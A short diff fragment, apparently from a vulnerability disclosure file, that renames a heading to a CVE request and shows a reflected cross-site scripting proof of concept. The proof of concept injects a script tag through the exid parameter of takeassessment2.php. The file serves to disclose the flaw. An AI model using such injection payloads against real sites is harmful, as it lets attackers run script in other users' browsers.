@@ -62,8 +62,8 @@ Poc XSS:
 
 ___
 
-
-Poc:
+## CVE Request 1928478:
+Poc XSS:
 
 - /takeassessment2.php?exid=6"><script>alert("Carlos%20Tuma%20-%20Bl4dsc4n")</script>
 
